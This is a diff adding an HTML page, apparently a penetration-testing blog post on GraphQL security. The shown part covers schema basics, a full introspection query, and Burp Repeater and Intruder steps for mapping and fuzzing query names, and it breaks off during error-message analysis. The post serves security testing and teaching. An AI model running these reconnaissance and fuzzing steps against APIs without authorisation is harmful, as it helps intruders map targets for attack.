@@ -1,0 +1,2167 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->GraphQL PenTest Methodology and Exploitation Techniques</title><meta name="description" content="GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by lettin..."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/graphql-security-flaws"/><meta property="og:title" content="GraphQL PenTest Methodology and Exploitation Techniques"/><meta property="og:description" content="GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by lettin..."/><meta property="og:image" content="https://xbz0n.sh/images/graphql-security.jpeg"/><meta property="og:image:width" content="1200"/><meta property="og:image:height" content="630"/><meta property="og:image:alt" content="GraphQL PenTest Methodology and Exploitation Techniques"/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/graphql-security-flaws"/><meta property="twitter:title" content="GraphQL PenTest Methodology and Exploitation Techniques"/><meta property="twitter:description" content="GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by lettin..."/><meta property="twitter:image" content="https://xbz0n.sh/images/graphql-security.jpeg"/><meta property="image" content="https://xbz0n.sh/images/graphql-security.jpeg"/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/graphql-security-flaws"/><meta name="next-head-count" content="24"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/be284b2f70ed0068.css" as="style"/><link rel="stylesheet" href="/_next/static/css/be284b2f70ed0068.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-ee7e63bc15b31913.js" defer=""></script><script src="/_next/static/chunks/framework-64ad27b21261a9ce.js" defer=""></script><script src="/_next/static/chunks/main-0a3c670da7f1f1eb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-6f140346224d0b31.js" defer=""></script><script src="/_next/static/chunks/676-8a913a0c6948fe82.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-80e53230ab478c73.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_buildManifest.js" defer=""></script><script src="/_next/static/EJgAsPo3Kz3qeohT_5Phd/_ssgManifest.js" defer=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/l/font?kit=tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg&skey=48ad01c60053c2ae&v=v24) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v24/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a><a href="https://app.hackthebox.com/public/users/8208" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="HackTheBox"><svg stroke="currentColor" fill="currentColor" stroke-width="0" role="img" viewBox="0 0 24 24" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><title></title><path d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">GraphQL PenTest Methodology and Exploitation Techniques</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2023-03-18">March 18, 2023</time></div></div><div class="blog-content">
+<p><img src="/images/graphql-security.jpeg" alt="GraphQL security vulnerabilities"></p>
+<h2>Introduction</h2>
+<p>GraphQL has become the darling of modern API development, and for good reason. It solves many of the headaches that come with traditional REST APIs by letting clients ask for exactly what they need and nothing more. But with this flexibility comes a complex attack surface that most security teams aren't prepared to handle.</p>
+<p>I've been breaking GraphQL APIs for years, and what I've found is that the same features that make GraphQL powerful also make it dangerous. That nested query structure that developers love? It's perfect for DoS attacks. The schema introspection that makes integration so easy? It's a goldmine for attackers mapping your API. The flexible queries? They're a playground for injection attacks.</p>
+<p>In this article, I'll walk you through how to exploit GraphQL from the ground up. We'll start with basic reconnaissance techniques to map out an API, move on to common vulnerabilities like injection and broken authentication, and finish with advanced attack chains that combine multiple flaws for maximum impact. Everything here is based on real-world penetration tests I've conducted, with practical examples you can try yourself.</p>
+<h2>GraphQL Fundamentals</h2>
+<p>Before we start breaking things, let's understand what makes GraphQL different from the REST APIs you're used to attacking. GraphQL is essentially a query language for your API - it gives clients the power to ask for specific data in a specific format, all in a single request.</p>
+<p>A typical GraphQL implementation consists of a schema that defines what data is available, resolvers that fetch that data from various sources, and a single endpoint that handles all requests. Here's what a basic schema looks like:</p>
+<pre class="language-graphql"><code class="language-graphql">type User {
+  id: ID!
+  username: String!
+  email: String!
+  profile: Profile
+  posts: [Post!]
+}
+
+type Profile {
+  id: ID!
+  firstName: String
+  lastName: String
+  address: String
+  phoneNumber: String
+  socialSecurityNumber: String
+}
+
+type Post {
+  id: ID!
+  title: String!
+  content: String!
+  author: User!
+  comments: [Comment!]
+}
+
+type Comment {
+  id: ID!
+  content: String!
+  author: User!
+}
+
+type Query {
+  user(id: ID!): User
+  users: [User!]!
+  post(id: ID!): Post
+  posts: [Post!]!
+}
+
+type Mutation {
+  createUser(username: String!, email: String!): User!
+  updateProfile(userId: ID!, firstName: String, lastName: String, address: String, phoneNumber: String): Profile!
+  createPost(title: String!, content: String!, authorId: ID!): Post!
+  deletePost(id: ID!): Boolean!
+}
+</code></pre>
+<p>The security issues with GraphQL stem from several key features:</p>
+<p>First, clients define their own queries. Unlike REST where the server dictates what data comes back for each endpoint, GraphQL lets clients specify exactly what fields they want - including fields they shouldn't have access to.</p>
+<p>Second, everything goes through a single endpoint. This means traditional security controls like per-endpoint rate limiting or access control don't work well. You need field-level security, which many implementations lack.</p>
+<p>Third, you can nest queries deeply. This can lead to exponential performance issues if you don't limit query depth. A single well-crafted query can bring down a server.</p>
+<p>Fourth, introspection lets clients query the schema itself. This is like giving attackers an API documentation that shows all the sensitive operations you support.</p>
+<p>Fifth, most GraphQL implementations support batching multiple operations in a single request. This is perfect for bypassing rate limits or brute-forcing credentials.</p>
+<p>Let me show you how to leverage these features to completely own a GraphQL API.</p>
+<h2>GraphQL Reconnaissance Techniques</h2>
+<p>The first phase of any GraphQL security assessment involves gathering information about the API structure. GraphQL's introspection feature makes this significantly easier than with REST APIs, allowing attackers to map out the entire API surface in minutes.</p>
+<h3>Leveraging Introspection</h3>
+<p>Introspection is a built-in GraphQL feature that allows clients to query the schema for information about available types, fields, queries, and mutations. While useful for development, it's a security liability in production environments.</p>
+<p>Here's how to perform a basic introspection query:</p>
+<pre class="language-graphql"><code class="language-graphql">query IntrospectionQuery {
+  __schema {
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+    subscriptionType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}
+
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+</code></pre>
+<p>This verbose query returns detailed information about the entire schema, including:</p>
+<ul>
+<li>All available queries and mutations</li>
+<li>All defined types and their fields</li>
+<li>Relationships between types</li>
+<li>Argument requirements for each operation</li>
+</ul>
+<p>To perform this reconnaissance with Burp Suite:</p>
+<ol>
+<li>
+<p><strong>Set up your GraphQL request in Burp Repeater</strong>:</p>
+<ul>
+<li>Create a POST request to the GraphQL endpoint</li>
+<li>Set the Content-Type header to <code>application/json</code></li>
+<li>In the request body, include: <code>{"query": "query { __schema { types { name kind fields { name } } } }"}</code></li>
+<li>This simplified introspection query will list types and their fields</li>
+</ul>
+</li>
+<li>
+<p><strong>Analyze the introspection response</strong>:</p>
+<ul>
+<li>Send the request and analyze the JSON response</li>
+<li>Look for sensitive object types like <code>User</code>, <code>Admin</code>, <code>Token</code>, etc.</li>
+<li>Note fields with names suggesting sensitive data (password, token, secret)</li>
+</ul>
+</li>
+<li>
+<p><strong>Expand your reconnaissance</strong>:</p>
+<ul>
+<li>Once you have the type names, craft more specific introspection queries</li>
+<li>For example, to explore a specific type: <code>{"query": "query { __type(name: \"User\") { name fields { name type { name kind ofType { name kind } } } } }"}</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Save findings in Burp</strong>:</p>
+<ul>
+<li>Use the "Save" feature in Burp Repeater to keep important responses for reference</li>
+<li>Create a separate request for each important schema component</li>
+</ul>
+</li>
+</ol>
+<h3>When Introspection is Disabled</h3>
+<p>Many production GraphQL APIs disable introspection as a security measure. However, this doesn't completely prevent reconnaissance. Several manual techniques can help map a GraphQL API without introspection:</p>
+<h4>1. Known query fuzzing with Burp Intruder</h4>
+<p>Since GraphQL operations follow predictable patterns, we can use Burp Intruder to fuzz the API with common query names:</p>
+<ol>
+<li>
+<p><strong>Create a base GraphQL query in Burp Repeater</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
+{"query": "query { FUZZ { id } }"}
+</code></pre>
+</li>
+<li>
+<p><strong>Send to Burp Intruder</strong>:</p>
+<ul>
+<li>Right-click and select "Send to Intruder"</li>
+<li>In the Positions tab, clear all automatically set positions</li>
+<li>Manually add the position markers around the field name: <code>{"query": "query { §FUZZ§ { id } }"}</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Configure the payload</strong>:</p>
+<ul>
+<li>In the Payloads tab, set Payload type to "Simple list"</li>
+<li>Add common GraphQL query names to the list:
+<pre class="language-none"><code class="language-none">user
+users
+getUser
+getUserById
+getUserByEmail
+product
+products
+getProduct
+getProductById
+post
+posts
+getPosts
+getPostsByUser
+order
+orders
+getOrder
+login
+authenticate
+search
+</code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Configure attack options</strong>:</p>
+<ul>
+<li>In the Options tab, set "Grep - Match" to look for patterns that indicate success</li>
+<li>Add patterns like "data", "errors", or specific error messages about arguments</li>
+</ul>
+</li>
+<li>
+<p><strong>Start the attack and analyze results</strong>:</p>
+<ul>
+<li>Launch the attack and review the results</li>
+<li>Look for responses that differ from the rest (different status code, length, or content)</li>
+<li>Valid fields will typically return specific errors about missing required arguments</li>
+</ul>
+</li>
+</ol>
+<h4>2. Error message analysis with Burp Repeater</h4>
+<p>GraphQL error messages are often verbose and reveal information about the schema. We can intentionally trigger errors to learn more about the API:</p>
+<ol>
+<li>
+<p><strong>Send an invalid query</strong>:</p>
+<pre class="language-none"><code class="language-none">POST /graphql HTTP/1.1
+Host: example.com
+Content-Type: application/json
+
